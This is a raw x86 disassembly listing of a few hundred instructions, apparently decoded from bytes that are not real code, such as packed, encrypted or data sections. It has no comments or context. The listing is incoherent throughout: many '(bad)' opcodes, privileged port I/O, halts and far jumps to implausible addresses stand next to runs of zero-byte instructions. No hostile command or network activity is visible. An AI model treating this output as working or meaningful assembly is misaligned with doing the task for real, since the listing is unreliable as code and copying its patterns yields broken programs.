  43c1d7:	add    eax,ebp
  43c1d9:	lea    edi,[ecx-0x7]
  43c1dc:	clc    
  43c1dd:	sub    ch,BYTE PTR [ebp+0x3f]
  43c1e0:	push   ss
  43c1e1:	call   0xa4c0d909
  43c1e6:	aad    0xf5
  43c1e8:	mov    ebp,0x18f5fb6a
  43c1ed:	popf   
  43c1ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43c1ef:	fild   DWORD PTR [ecx-0x180686eb]
  43c1f5:	and    esi,DWORD PTR [edx-0x7]
  43c1f8:	clc    
  43c1f9:	add    BYTE PTR [edi],bl
  43c1fb:	jl     0x43c20b
  43c1fd:	add    BYTE PTR [ecx],ah
  43c1ff:	cli    
  43c200:	add    DWORD PTR [ebp-0x3a],0x0
  43c204:	cmp    eax,0x1bb40f23
  43c209:	push   es
  43c20a:	fistp  QWORD PTR [ebx+0x75]
  43c20d:	push   ss
  43c20e:	popf   
  43c20f:	jp     0x43c20f
  43c211:	out    0x38,eax
  43c213:	push   esi
  43c215:	dec    edi
  43c217:	cmp    DWORD PTR ds:0x1b4a5d1a,0xffffff83
  43c21e:	xchg   ecx,eax
  43c21f:	sbb    edi,edx
  43c221:	ret    0x5a34
  43c224:	cld    
  43c225:	dec    DWORD PTR [ebx]
  43c227:	out    0x90,al
  43c229:	cld    
  43c22a:	sbb    edi,edi
  43c22c:	jp     0x43c2ab
  43c22e:	inc    edx
  43c22f:	jmp    FWORD PTR [ebx+ecx*1-0x29]
  43c233:	dec    ecx
  43c234:	adc    al,BYTE PTR [ecx]
  43c236:	xchg   ecx,eax
  43c237:	sbb    edi,DWORD PTR [ebx+0x45]
  43c23a:	add    BYTE PTR [eax],al
  43c23c:	add    BYTE PTR [eax],al
  43c23e:	add    BYTE PTR [edi],bh
  43c240:	sti    
  43c241:	mov    edx,0xf9192983
  43c246:	je     0x43c25a
  43c248:	out    0x32,eax
  43c24a:	dec    DWORD PTR [ebx-0x1e744501]
  43c250:	adc    al,0xf9
  43c252:	inc    esp
  43c253:	jg     0x43c2d0
  43c255:	cmp    eax,0xe0bc0e23
  43c25a:	and    ch,BYTE PTR [eax-0x3d170901]
  43c260:	repnz idiv edi
  43c263:	pop    edi
  43c264:	or     DWORD PTR ds:0xe8092a01,0xf6ff8b19
  43c26e:	ret    
  43c26f:	inc    edi
  43c270:	dec    ecx
  43c271:	adc    al,BYTE PTR [ecx]
  43c273:	adc    DWORD PTR [ebx+edi*2],ebx
  43c276:	inc    ebp
  43c277:	jne    0x43c241
  43c279:	add    bh,BYTE PTR [ebp-0x7076133]
  43c27f:	mov    dl,0x67
  43c281:	jg     0x43c295
  43c283:	jae    0x43c2f8
  43c285:	pop    es
  43c286:	call   0xf941ad2b
  43c28b:	mov    dh,0x0
  43c28d:	hlt    
  43c28e:	hlt    
  43c28f:	xchg   edx,eax
  43c290:	fisttp DWORD PTR [ecx+0x47ea6f42]
  43c296:	sbb    eax,0xfe2125f6
  43c29b:	mov    bh,0xc0
  43c29d:	fdivr  st(4),st
  43c29f:	jb     0x43c26a
  43c2a1:	in     al,0x23
  43c2a3:	add    BYTE PTR [eax],al
  43c2a5:	add    BYTE PTR [eax],al
  43c2a7:	add    BYTE PTR [ecx-0x4f],ch
  43c2aa:	std    
  43c2ab:	jl     0x43c28d
  43c2ad:	rol    DWORD PTR [edi],1
  43c2af:	jp     0x43c324
  43c2b1:	ret    
  43c2b2:	aad    0xf9
  43c2b4:	push   edx
  43c2b5:	test   eax,0x5b084c1
  43c2ba:	add    eax,DWORD PTR [ebx-0x6a]
  43c2bd:	pop    esp
  43c2be:	dec    eax
  43c2bf:	sbb    eax,0xb8e49c77
  43c2c4:	cs mov ebp,edi
  43c2c7:	out    0x76,eax
  43c2c9:	outs   dx,DWORD PTR ds:[esi]
  43c2ca:	(bad)  
  43c2cb:	clc    
  43c2cc:	div    dh
  43c2ce:	push   ss
  43c2cf:	add    BYTE PTR [eax+0x7f7a81d5],ah
  43c2d5:	fmul   QWORD PTR ds:0xfcdbd983
  43c2db:	push   esi
  43c2dd:	(bad)  
  43c2de:	push   cs
  43c2df:	add    al,0x6a
  43c2e1:	push   ecx
  43c2e2:	mov    ds:0xe4dbf2ff,eax
  43c2e7:	popf   
  43c2e8:	jmp    0x43c31a
  43c2ea:	(bad)  
  43c2eb:	mov    esp,0xff16b6f6
  43c2f0:	popa   
  43c2f1:	aad    0x81
  43c2f3:	jp     0x43c374
  43c2f5:	add    ah,dh
  43c2f7:	adc    dh,dh
  43c2f9:	jle    0x43c2e1
  43c2fb:	add    esi,DWORD PTR [ebp-0x7b]
  43c2fe:	xchg   ebx,eax
  43c2ff:	adc    DWORD PTR [edx-0x4d7aa700],edi
  43c305:	icebp  
  43c306:	out    0xeb,al
  43c308:	sub    al,dh
  43c30a:	stc    
  43c30b:	add    DWORD PTR [eax],eax
  43c30d:	add    BYTE PTR [eax],al
  43c30f:	add    BYTE PTR [eax],al
  43c311:	loopne 0x43c298
  43c313:	jae    0x43c32e
  43c315:	fwait
  43c316:	jbe    0x43c2ef
  43c318:	xchg   BYTE PTR [edi],cl
  43c31a:	cld    
  43c31b:	in     eax,0x10
  43c31d:	neg    BYTE PTR [esi-0x19]
  43c320:	add    esi,DWORD PTR [ebp-0x26]
  43c323:	inc    edx
  43c324:	add    bh,BYTE PTR [ecx+esi*8-0x5b]
  43c328:	test   edi,ebp
  43c32a:	sbb    dh,ah
  43c32c:	jbe    0x43c3a7
  43c32e:	test   DWORD PTR [ebx],edi
  43c330:	push   cs
  43c331:	pusha  
  43c332:	jbe    0x43c341
  43c334:	in     al,dx
  43c335:	shl    al,0xa9
  43c338:	add    DWORD PTR [eax],edx
  43c33a:	test   DWORD PTR [ebx],esp
  43c33c:	sbb    dh,BYTE PTR [ecx+0x77]
  43c33f:	jmp    0x43c2c5
  43c341:	mov    edi,0xad76e5fc
  43c346:	ficomp DWORD PTR [esi]
  43c348:	add    ch,BYTE PTR [ecx+esi*8]
  43c34b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43c34c:	test   DWORD PTR [edi+0x7776e418],ebp
  43c352:	fidiv  DWORD PTR [edx-0x5a0ee3ff]
  43c358:	test   DWORD PTR [edi+0x7976e918],ecx
  43c35e:	test   ebx,ebx
  43c360:	or     eax,0xebfd7600
  43c365:	push   eax
  43c366:	lock dec ecx
  43c368:	add    DWORD PTR [eax],esi
  43c36a:	test   ebx,eax
  43c36c:	sbb    DWORD PTR [edi+esi*2-0x27],esi
  43c370:	test   BYTE PTR [edi-0x4],bl
  43c373:	(bad)  
  43c374:	jmp    0x43c379
  43c379:	add    BYTE PTR [ebx+0xa],ah
  43c37c:	jge    0x43c32a
  43c37e:	mov    DWORD PTR [edx+0x73],eax
  43c381:	cmc    
  43c382:	icebp  
  43c383:	imul   ecx,DWORD PTR [edx],0xffffffe9
  43c386:	dec    edx
  43c387:	(bad)  
  43c388:	out    0xe5,eax
  43c38a:	je     0x43c377
  43c38c:	clc    
  43c38d:	sub    ah,BYTE PTR [ecx+0x7406fa02]
  43c393:	scas   eax,DWORD PTR es:[edi]
  43c394:	test   BYTE PTR [eax+eax*4-0xe35bc0f],ah
  43c39b:	inc    ebx
  43c39c:	sbb    eax,0xe9e8b9eb
  43c3a1:	jecxz  0x43c418
  43c3a3:	jmp    0x43c38c
  43c3a5:	sbb    eax,DWORD PTR [eax-0x4950717]
  43c3ab:	adc    eax,DWORD PTR [esp+ecx*2]
  43c3ae:	jg     0x43c38a
  43c3b0:	loop   0x43c376
  43c3b2:	jne    0x43c39d
  43c3b4:	mov    esp,0xff18bb72
  43c3b9:	sub    edx,DWORD PTR [eax+0x780a436d]
  43c3bf:	lods   eax,DWORD PTR ds:[esi]
  43c3c0:	out    0xb4,eax
  43c3c2:	dec    eax
  43c3c3:	jmp    0x43c3bd
  43c3c5:	xchg   ecx,eax
  43c3c6:	addr16 cmc 
  43c3c8:	clc    
  43c3c9:	xchg   esi,eax
  43c3ca:	icebp  
  43c3cb:	ins    BYTE PTR es:[edi],dx
  43c3cc:	adc    ch,cl
  43c3ce:	stos   DWORD PTR es:[edi],eax
  43c3cf:	add    al,0xe8
  43c3d1:	lods   eax,DWORD PTR ds:[esi]
  43c3d2:	sub    ebp,ebx
  43c3d4:	clc    
  43c3d5:	stos   BYTE PTR es:[edi],al
  43c3d6:	stc    
  43c3d7:	ins    BYTE PTR es:[edi],dx
  43c3d8:	adc    ch,bl
  43c3da:	mov    ds:0x31e804,eax
  43c3df:	add    BYTE PTR [eax],al
  43c3e1:	add    BYTE PTR [eax],al
  43c3e3:	adc    ebp,ebx
  43c3e5:	clc    
  43c3e6:	sub    dh,cl
  43c3e8:	ins    BYTE PTR es:[edi],dx
  43c3e9:	adc    ch,dl
  43c3eb:	mov    eax,DWORD PTR [eax+ebp*8]
  43c3ee:	test   ebx,edi
  43c3f0:	jmp    0x12:0x6cf92af8
  43c3f7:	fdivr  DWORD PTR [eax-0x2]
  43c3fa:	out    0xec,eax
  43c3fc:	lock idiv edi
  43c3ff:	pop    DWORD PTR [esi+0x78d91675]
  43c405:	(bad)  
  43c406:	out    0x48,eax
  43c408:	lock idiv edi
  43c40b:	pop    DWORD PTR [esi-0x7e34e98b]
  43c411:	std    
  43c412:	out    0x14,eax
  43c414:	lock idiv edi
  43c417:	pop    edi
  43c418:	jle    0x43c457
  43c41a:	sbb    cl,BYTE PTR [ebp-0x367ce4b8]
  43c420:	es cli 
  43c422:	ret    0xac74
  43c425:	bnd call DWORD PTR [ebx-0x73e98a7d]
  43c42c:	push   0xfffffffe
  43c42e:	out    0x30,eax
  43c430:	add    edi,esi
  43c432:	call   FWORD PTR [edi]
  43c434:	xor    DWORD PTR [ebp+0x16],0x5d
  43c438:	push   0xfffffffe
  43c43a:	out    0xac,eax
  43c43c:	add    edi,esi
  43c43e:	dec    DWORD PTR [edi]
  43c440:	xor    DWORD PTR [ebp+0x16],0x5e
  43c444:	push   0x9
  43c446:	call   0x43c44b
  43c44b:	add    BYTE PTR [ecx-0x30000814],al
  43c451:	add    DWORD PTR [ecx],0xe8545803
  43c457:	dec    ecx
  43c458:	add    edi,ebp
  43c45a:	test   ebx,0x30d819f
  43c460:	sub    DWORD PTR ds:0xefa13de8,eax
  43c466:	test   ebx,0x40d819f
  43c46c:	sub    DWORD PTR [esi],edx
  43c46e:	call   0xf8335a9d
  43c473:	xor    DWORD PTR [ebp-0x2a],0x6
  43c477:	std    
  43c478:	data16 lock in al,0x21
  43c47c:	call   0xf700bdc8
  43c481:	lods   eax,DWORD PTR ds:[esi]
  43c482:	adc    al,BYTE PTR [ebx]
  43c484:	pusha  
  43c485:	(bad)  
  43c487:	adc    eax,0xbcf91fd0
  43c48c:	mul    BYTE PTR [ebp-0x15b7fdee]
  43c492:	in     al,0x0
  43c494:	mov    edi,0x307cf917
  43c499:	jecxz  0x43c498
  43c49b:	jae    0x43c516
  43c49d:	adc    ebp,edi
  43c49f:	cli    
  43c4a0:	mov    ds:0x98e7bdef,al
  43c4a5:	hlt    
  43c4a6:	stc    
  43c4a7:	clc    
  43c4a8:	mov    dh,0x63
  43c4aa:	inc    edi
  43c4ab:	push   ss
  43c4ac:	je     0x43c4cc
  43c4ae:	sbb    eax,0x7d
  43c4b3:	add    BYTE PTR [eax],al
  43c4b5:	cmp    ah,bh
  43c4b7:	cld    
  43c4b8:	mov    esp,0xf8f6068d
  43c4bd:	jb     0x43c518
  43c4bf:	adc    BYTE PTR [edx],0x75
  43c4c2:	cs add ch,al
  43c4c5:	push   esp
  43c4c6:	mov    al,0xf9
  43c4c8:	clc    
  43c4c9:	ss pop ecx
  43c4cb:	adc    BYTE PTR [edx],0x74
  43c4ce:	ss add ch,al
  43c4d1:	and    BYTE PTR [eax+0x5936f8f9],ch
  43c4d7:	adc    BYTE PTR [edx],0x77
  43c4da:	push   cs
  43c4db:	adc    ebp,eax
  43c4dd:	aaa    
  43c4de:	xchg   ebx,eax
  43c4df:	stc    
  43c4e0:	clc    
  43c4e1:	test   BYTE PTR [esi],0x6
  43c4e4:	std    
  43c4e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43c4e6:	or     esp,ebp
  43c4e8:	mov    ecx,0xbcfa7519
  43c4ed:	neg    dh
  43c4ef:	adc    bh,ch
  43c4f1:	add    DWORD PTR [edx],0xeed0ebe9
  43c4f7:	pop    ecx
  43c4f8:	(bad)  
  43c4f9:	mov    ecx,0x7915d381
  43c4fe:	ja     0x43c4f8
  43c500:	jmp    0x43c50f
  43c502:	in     al,dx
  43c503:	inc    ecx
  43c504:	(bad)  
  43c505:	popa   
  43c506:	outs   dx,DWORD PTR ds:[esi]
  43c507:	in     eax,dx
  43c508:	add    ah,BYTE PTR [ecx+0x1d]
  43c50b:	aas    
  43c50c:	call   0x6f49:0xc229edce
  43c513:	stc    
  43c514:	or     BYTE PTR [esi+0x4],al
  43c517:	jle    0x43c51d
  43c51d:	add    BYTE PTR [esi+0x31c211ed],bh
  43c523:	outs   dx,DWORD PTR ds:[esi]
  43c524:	icebp  
  43c525:	add    eax,0x7f0f1326
  43c52a:	stos   BYTE PTR es:[edi],al
  43c52b:	in     eax,dx
  43c52c:	stc    
  43c52d:	sbb    DWORD PTR [edi],0x8177e5f8
  43c533:	fisubr DWORD PTR [esi-0x1]
  43c536:	(bad)  
  43c537:	in     eax,dx
  43c538:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43c539:	in     al,dx
  43c53a:	adc    dh,ch
  43c53c:	fscale 
  43c53e:	mov    ecx,0x721a2b79
  43c543:	inc    esi
  43c544:	push   es
  43c545:	xor    DWORD PTR [edi+0x5ac0e621],0x5dfdbfa1
  43c54f:	xor    DWORD PTR [ebx],0xe1777516
  43c555:	jmp    0x43c4fb
  43c557:	out    dx,al
  43c558:	mov    eax,ds:0x1b8101fd
  43c55d:	push   ss
  43c55e:	cmp    dh,BYTE PTR [esi-0x17]
  43c561:	jmp    0x43c51b
  43c563:	out    dx,al
  43c564:	mov    ebp,edi
  43c566:	jmp    0x2359c8eb
  43c56b:	jbe    0x43c541
  43c56d:	jmp    0x43c5d4
  43c56f:	jmp    0x43c570
  43c571:	jne    0x43c583
  43c573:	outs   dx,BYTE PTR ds:[esi]
  43c574:	jnp    0x43c559
  43c576:	jne    0x43c573
  43c578:	and    edx,0x76
  43c57b:	add    al,BYTE PTR [eax]
  43c57d:	push   ecx
  43c57e:	dec    eax
  43c57f:	out    dx,al
  43c580:	clc    
  43c581:	push   esi
  43c582:	add    BYTE PTR [eax],al
  43c584:	add    BYTE PTR [eax],al
  43c586:	add    BYTE PTR [ebp+ebp*2+0x7175f77b],dh
  43c58d:	sbb    ebp,DWORD PTR [edx+0x62]
  43c590:	in     al,dx
  43c591:	or     BYTE PTR [edi+eax*4-0x2fcfee26],dh
  43c598:	jmp    0xefc07219
  43c59d:	ins    BYTE PTR es:[edi],dx
  43c59e:	(bad)  
  43c59f:	into   
  43c5a0:	(bad)  
  43c5a1:	sti    
  43c5a2:	push   ds
  43c5a3:	mov    eax,0xb2e5e7ad
  43c5a8:	jmp    0x6837f0a5
  43c5ad:	adc    ch,ch
  43c5af:	sub    eax,DWORD PTR [eax]
  43c5b1:	call   0xf92d609f
  43c5b6:	sub    dh,ah
  43c5b8:	addr16 adc ah,ah
  43c5bb:	add    eax,DWORD PTR [eax]
  43c5bd:	call   0xf92d439f
  43c5c2:	stos   BYTE PTR es:[edi],al
  43c5c3:	cmc    
  43c5c4:	addr16 adc ch,bh
  43c5c7:	jmp    0x43c5c4
  43c5c9:	out    0xc8,eax
  43c5cb:	outs   dx,BYTE PTR ds:[esi]
  43c5cc:	jmp    0x43c5c6
  43c5ce:	push   0xffffffe3
  43c5d0:	add    al,0xfd
  43c5d2:	xor    al,0x8e
  43c5d4:	fcmovu st,st(2)
  43c5d6:	mov    dl,0x51
  43c5d8:	jmp    0x43c596
  43c5da:	push   0xffffffcb
  43c5dc:	adc    BYTE PTR [ecx],al
  43c5de:	sbb    al,0x68
  43c5e0:	ins    DWORD PTR es:[edi],dx
  43c5e1:	jnp    0x43c5ce
  43c5e3:	outs   dx,WORD PTR ds:[esi]
  43c5e5:	jno    0x8f3cba25
  43c5eb:	add    BYTE PTR [eax],al
  43c5ed:	add    BYTE PTR [eax],al
  43c5ef:	add    ch,dh
  43c5f1:	push   0x740f0006
  43c5f6:	or     al,0xe8
  43c5f8:	int3   
  43c5f9:	jmp    0xfbb2:0xd7dffff7
  43c600:	fwait
  43c601:	out    dx,al
  43c602:	mov    ebx,0xf909d18b
  43c607:	inc    esp
  43c608:	outs   dx,DWORD PTR ds:[esi]
  43c609:	cmp    DWORD PTR ds:0xe0c2df23,0xf7ee44eb
  43c613:	cmp    DWORD PTR [ecx-0x3e8affeb],0xffffffd7
  43c61a:	(bad)  
  43c61b:	clc    
  43c61c:	mov    ebp,esi
  43c61e:	jnp    0x43c69d
  43c620:	(bad)  
  43c621:	add    al,BYTE PTR [edi]
  43c623:	test   DWORD PTR [edi+edi*8],ebp
  43c626:	(bad)  
  43c627:	jmp    DWORD PTR [esi+edi*2-0xd]
  43c62b:	dec    DWORD PTR [ebx-0x5d82843e]
  43c631:	add    BYTE PTR [ebp+0x15],ch
  43c634:	test   BYTE PTR [ebx-0x8],ch
  43c637:	call   FWORD PTR [ebx-0x60f58995]
  43c63d:	(bad)  
  43c63e:	jl     0x43c5c5
  43c640:	pushf  
  43c641:	(bad)  
  43c642:	jmp    edi
  43c644:	and    bl,ch
  43c646:	idiv   edi
  43c648:	iret   
  43c649:	xor    DWORD PTR [ebp+0x16],0x5e
  43c64d:	jb     0x43c65c
  43c64f:	call   0x3bb511
  43c654:	add    BYTE PTR [eax],al
  43c656:	add    BYTE PTR [eax],al
  43c658:	add    bh,cl
  43c65a:	imul   eax,DWORD PTR [edx],0x62824b03
  43c660:	add    BYTE PTR [edi+edi*8-0x19],bl
  43c664:	pop    ecx
  43c665:	pop    es
  43c666:	out    0xf7,eax
  43c668:	ret    
  43c669:	iret   
  43c66a:	imul   ecx,DWORD PTR [esi],0xe8156103
  43c670:	inc    esi
  43c671:	jne    0x43c604
  43c673:	hlt    
  43c674:	clc    
  43c675:	idiv   ch
  43c677:	or     ebp,edi
  43c679:	test   eax,0x1e3dec08
  43c67e:	ins    BYTE PTR es:[edi],dx
  43c67f:	cmc    
  43c680:	mov    esp,0x40ef5f6
  43c685:	and    bl,0xe4
  43c688:	xor    esi,edi
  43c68a:	arpl   bp,si
  43c68c:	mov    esp,0x30ecdf6
  43c691:	push   0xed1ce4ea
  43c696:	cmp    esi,ebp
  43c698:	jl     0x43c6fa
  43c69a:	out    dx,eax
  43c69b:	add    DWORD PTR [ebx-0x5b],esi
  43c69e:	push   ecx
  43c69f:	adc    eax,0xc133d2f5
  43c6a4:	jl     0x43c6ee
  43c6a6:	sar    esi,cl
  43c6a8:	jb     0x43c70e
  43c6aa:	adc    DWORD PTR [eax],ecx
  43c6ac:	clc    
  43c6ad:	mov    edx,0x7f7a810b
  43c6b2:	fsubr  DWORD PTR [edi+0x17]
  43c6b5:	popf   
  43c6b6:	loopne 0x43c6b1
  43c6b8:	clc    
  43c6b9:	mov    ds:0x7a8117,al
  43c6be:	add    BYTE PTR [eax],al
  43c6c0:	add    BYTE PTR [eax],al
  43c6c2:	and    esp,0x75
  43c6c5:	add    DWORD PTR [ebp-0x75071213],ebx
  43c6cb:	(bad)  
  43c6cc:	std    
  43c6cd:	out    0x88,eax
  43c6cf:	fdivrp st(5),st
  43c6d1:	clc    
  43c6d2:	mov    dh,0x6f
  43c6d4:	inc    eax
  43c6d5:	push   ss
  43c6d6:	je     0x43c6ee
  43c6d8:	and    DWORD PTR [ebp-0x50],edi
  43c6db:	cld    
  43c6dc:	add    DWORD PTR [ebp-0x70405b3],edi
  43c6e2:	pop    edx
  43c6e3:	pop    ebp
  43c6e4:	js     0x43c6f8
  43c6e6:	jne    0x43c70e
  43c6e8:	adc    ebp,eax
  43c6ea:	daa    
  43c6eb:	mov    cl,0xf5
  43c6ed:	clc    
  43c6ee:	test   BYTE PTR [edx],0x24
  43c6f1:	push   cs
  43c6f2:	cmp    BYTE PTR [edi+0x38],ch
  43c6f5:	in     al,dx
  43c6f6:	cmp    al,0xed
  43c6f8:	xchg   ecx,eax
  43c6f9:	cli    
  43c6fa:	jmp    0x2255d284
  43c6ff:	outs   dx,DWORD PTR ds:[esi]
  43c700:	fsubr  st,st(3)
  43c702:	loope  0x43c6f5
  43c704:	jns    0x43c700
  43c706:	xchg   ecx,eax
  43c707:	fld    QWORD PTR ds:0x2c86
  43c70c:	jg     0x43c6c0
  43c70e:	or     dl,ch
  43c710:	popa   
  43c711:	(bad)  
  43c712:	jns    0x43c77b
  43c714:	icebp  
  43c715:	add    eax,0x9f3f1366
  43c71a:	in     eax,0xe9
  43c71c:	dec    ecx
  43c71d:	xchg   BYTE PTR [edi-0x4],bl
  43c720:	in     eax,0x70
  43c722:	js     0x43c6fe
  43c724:	xchg   ch,bh
  43c726:	add    BYTE PTR [eax],al
  43c728:	add    BYTE PTR [eax],al
  43c72a:	add    ch,cl
  43c72c:	jmp    0x10934d56
  43c731:	out    0x70,al
  43c733:	jb     0x43c70f
  43c735:	jae    0x43c729
  43c737:	mov    ebp,0x7b7865e9
  43c73c:	add    eax,0x7b9d079c
  43c741:	or     al,0xfa
  43c743:	popf   
  43c744:	lds    ecx,FWORD PTR [esi]
  43c746:	xchg   BYTE PTR [eax-0x63a0617],ah
  43c74c:	aas    
  43c74d:	int    0x4
  43c74f:	ss and eax,0x4604066
  43c755:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43c756:	stc    
  43c757:	aaa    
  43c758:	and    eax,0xf9733fa2
  43c75d:	out    0x3,al
  43c75f:	jne    0x43c749
  43c761:	and    esp,DWORD PTR [esi]
  43c763:	cmc    
  43c764:	add    ax,0xe609
  43c768:	add    bh,cl
  43c76a:	pop    ecx
  43c76b:	dec    ebx
  43c76c:	jmp    0x7e747d70
  43c771:	inc    edx
  43c772:	or     ch,BYTE PTR [esp+esi*4+0x7]
  43c776:	je     0x43c7ed
  43c778:	jl     0x43c776
  43c77a:	call   0x96477078
  43c77f:	inc    ecx
  43c780:	ret    0xeb42
  43c783:	push   esi
  43c784:	add    al,BYTE PTR [eax]
  43c786:	jmp    0xca86b1bc
  43c78b:	or     al,0x44
  43c78d:	push   ds
  43c78e:	imul   eax,DWORD PTR [eax],0x0
  43c794:	or     BYTE PTR [eax],0x9
  43c797:	hlt    
  43c798:	je     0x43c774
  43c79a:	xor    ah,BYTE PTR [ebx-0x4]
  43c79d:	jmp    0x47e3a5e
  43c7a2:	iret   
  43c7a3:	inc    eax
  43c7a4:	dec    BYTE PTR [ebx+0x2]
  43c7a7:	bound  esp,QWORD PTR [edx+0x697f0907]
  43c7ad:	jge    0x43c7b2
  43c7af:	outs   dx,DWORD PTR ds:[esi]
  43c7b0:	js     0x43c7b4
  43c7b2:	jge    0x43c7dd
  43c7b4:	jne    0x43c7a1
  43c7b6:	iret   
  43c7b7:	bound  ebp,QWORD PTR [edx]
  43c7b9:	add    al,0xcf
  43c7bb:	or     dh,ch
  43c7bd:	cmp    eax,DWORD PTR [edx]
  43c7bf:	sub    ch,BYTE PTR [ebx+eax*2+0x86a171d]
  43c7c6:	or     BYTE PTR [eax+ebx*2-0x71108d05],0xe6
  43c7ce:	idiv   dh
  43c7d0:	lea    esp,[ebp-0x4ae537c]
  43c7d6:	mov    cl,0xe9
  43c7d8:	dec    edx
  43c7d9:	sahf   
  43c7da:	jae    0x43c7d7
  43c7dc:	inc    edx
  43c7dd:	mov    ds:0x9caaef73,eax
  43c7e2:	jae    0x43c7c7
  43c7e4:	mov    ds:0xaae77399,al
  43c7e9:	stc    
  43c7ea:	jae    0x43c7ec
  43c7ec:	dec    esi
  43c7ed:	xlat   BYTE PTR ds:[ebx]
  43c7ee:	cld    
  43c7ef:	lds    ebx,FWORD PTR [ecx-0x66750702]
  43c7f5:	sbb    eax,0xb607
  43c7fa:	add    BYTE PTR [eax],al
  43c7fc:	add    BYTE PTR [ecx+eax*4-0x4],dl
  43c800:	lea    ecx,[edi+0x4]
  43c803:	jnp    0x43c7c5
  43c805:	sbb    bl,ch
  43c807:	enter  0x59c6,0xfe
  43c80b:	inc    edx
  43c80d:	repz sub BYTE PTR [ebx],bl
  43c810:	dec    BYTE PTR [ecx+0x20]
  43c813:	cmp    BYTE PTR [ebp+0x3e],0xfb
  43c817:	ins    BYTE PTR es:[edi],dx
  43c818:	push   es
  43c819:	hlt    
  43c81a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43c81b:	icebp  
  43c81c:	call   DWORD PTR [ebx+0x6f4583be]
  43c822:	stc    
  43c823:	lods   eax,DWORD PTR ds:[esi]
  43c824:	add    BYTE PTR [eax-0x7fc19372],dl
  43c82a:	mov    ds:0x87703a6c,al
  43c82f:	ins    BYTE PTR es:[edi],dx
  43c830:	ss jo  0x43c7d7
  43c833:	ins    BYTE PTR es:[edi],dx
  43c834:	xor    dl,al
  43c836:	mov    ds:0x95c02e6c,al
  43c83b:	ins    BYTE PTR es:[edi],dx
  43c83c:	sub    dl,al
  43c83e:	xchg   esi,eax
  43c83f:	ins    BYTE PTR es:[edi],dx
  43c840:	rcr    BYTE PTR es:[edi-0x5f2fdd94],1
  43c847:	ins    BYTE PTR es:[edi],dx
  43c848:	push   ds
  43c849:	rcr    BYTE PTR [ecx-0x654fe594],0x6c
  43c850:	push   ss
  43c851:	mov    al,0x5f
  43c853:	je     0x43c867
  43c855:	shl    BYTE PTR [eax+0x74],1
  43c858:	push   cs
  43c859:	rcr    BYTE PTR [ecx+0x74],0xa
  43c85d:	rcr    BYTE PTR [edx+0x74],1
  43c860:	push   es
  43c861:	add    BYTE PTR [eax],al
  43c863:	add    BYTE PTR [eax],al
  43c865:	add    BYTE PTR [eax-0x1],dl
  43c868:	jae    0x43c86c
  43c86a:	inc    edi
  43c86b:	add    bh,BYTE PTR [esi+0x3da7545]
  43c871:	test   DWORD PTR [eax+0x6db200fc],edi
  43c877:	outs   dx,BYTE PTR ds:[esi]
  43c878:	add    BYTE PTR [edx-0x4082268a],cl
  43c87e:	jno    0x43c830
  43c880:	rol    ecx,cl
  43c882:	mov    eax,0x3abcfcda
  43c887:	push   ss
  43c888:	sbb    eax,0x7cbbb8fa
  43c88d:	jp     0x43c8e6
  43c88f:	loopne 0x43c900
  43c891:	add    cl,BYTE PTR ds:0x1af8fb21
  43c897:	pushf  
  43c898:	test   BYTE PTR [edx+0x56],al
  43c89b:	fsubr  DWORD PTR [edx-0x7dab07f9]
  43c8a1:	push   DWORD PTR [esi-0x27]
  43c8a4:	cld    
  43c8a5:	cld    
  43c8a6:	cli    
  43c8a7:	pop    ebx
  43c8a8:	les    eax,FWORD PTR [ebx]
  43c8aa:	repnz sub BYTE PTR [ebp-0xe03cf08],bh
  43c8b1:	inc    edx
  43c8b2:	xchg   edi,eax
  43c8b3:	pop    ecx
  43c8b4:	ja     0x43c8d4
  43c8b6:	push   0xffffffa6
  43c8b8:	cli    
  43c8b9:	out    0x94,eax
  43c8bb:	inc    edx
  43c8bc:	icebp  
  43c8bd:	clc    
  43c8be:	mov    dh,0x63
  43c8c0:	aas    
  43c8c1:	sbb    eax,0x8b0c6f72
  43c8c6:	icebp  
  43c8c7:	outs   dx,BYTE PTR ds:[esi]
  43c8c8:	add    al,0x8
  43c8ca:	add    BYTE PTR [eax],al
  43c8cc:	add    BYTE PTR [eax],al
  43c8ce:	add    BYTE PTR [ebp-0x27],dh
  43c8d1:	std    
  43c8d2:	push   esi
  43c8d4:	sbb    BYTE PTR [eax],al
  43c8d6:	stc    
  43c8d7:	lds    ebx,FWORD PTR [ebx]
  43c8d9:	icebp  
  43c8da:	inc    edx
  43c8db:	push   esi
  43c8dc:	(bad)  
  43c8dd:	ds push ds
  43c8df:	cmc    
  43c8e0:	gs pop ds
  43c8e2:	or     DWORD PTR [eax],eax
  43c8e4:	xlat   BYTE PTR ds:[ebx]
  43c8e5:	in     al,0xf5
  43c8e7:	jge    0x43c8c0
  43c8e9:	icebp  
  43c8ea:	mov    esp,0x232c01ee
  43c8ef:	jl     0x43c89d
  43c8f1:	out    dx,al
  43c8f2:	mov    dh,dh
  43c8f4:	je     0x43c8dc
  43c8f6:	pop    es
  43c8f7:	jne    0x43c8fb
  43c8f9:	out    0x3,al
  43c8fb:	fadd   st,st(2)
  43c8fd:	jmp    0x6340:0xa1c242f6
  43c904:	add    ah,bh
  43c906:	add    esi,DWORD PTR [ebp+0x79]
  43c909:	and    esp,DWORD PTR [ebx]
  43c90b:	ins    BYTE PTR es:[edi],dx
  43c90c:	lods   al,BYTE PTR ds:[esi]
  43c90d:	es add eax,0x3e6a56e
  43c913:	jne    0x43c97a
  43c915:	clc    
  43c916:	jmp    0x43c986
  43c918:	in     al,dx
  43c919:	mov    esi,esi
  43c91b:	cdq    
  43c91c:	addr16 fsin 
  43c91f:	mov    esp,?
  43c921:	mov    ?,WORD PTR [esi-0x3d8e19fe]
  43c927:	sbb    dh,BYTE PTR [ecx+0x79fdf673]
  43c92d:	stos   DWORD PTR es:[edi],eax
  43c92e:	sbb    edx,esi
  43c930:	ds push es
  43c932:	add    DWORD PTR [eax],0x0
  43c935:	add    BYTE PTR [eax],al
  43c937:	add    BYTE PTR [edi],dh
  43c939:	and    ebp,esp
  43c93b:	ret    0x3fb5
  43c93e:	in     eax,dx
  43c93f:	add    esi,DWORD PTR [ebp+0x2]
  43c942:	out    0x8a,eax
  43c944:	aaa    
  43c945:	and    edx,ebp
  43c947:	lods   eax,DWORD PTR ds:[esi]
